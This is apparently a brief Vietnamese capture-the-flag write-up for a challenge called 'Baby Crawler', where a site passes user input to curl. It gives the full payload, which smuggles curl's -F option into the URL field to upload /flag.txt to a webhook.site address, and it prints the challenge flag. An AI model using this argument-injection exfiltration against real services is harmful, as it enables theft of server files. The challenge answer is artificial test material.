# Baby Crawler

Bài này cung cấp cho chúng ta source code
Sau khi thử với payload mà bài cho ta thấy được trang web sẽ thực hiện crawl nội dung html của payload mà ta chuyền vào vào file cache
Chính vì vậy ta có thể redirect file cache tải về theo host mà ta kiểm soát
Mình dùng option -F của curl để redirect file cache về host của mình trên webhook
Payload sẽ là:  *https://vnexpress.net/viet-nam-xuat-khau-sang-my-latinh-mot-ty-usd-moi-thang-4541275.html -F file=@/flag.txt https://webhook.site/e321f04e-a30a-4ffb-af21-9dd59c818fab*
Sau khi tải về mở lên và lấy flag thôi.

*Flag: CHH{b48Y_CUrl_CrAwl3r_5b0170b3ed22587bae9b17f9aeae60af}*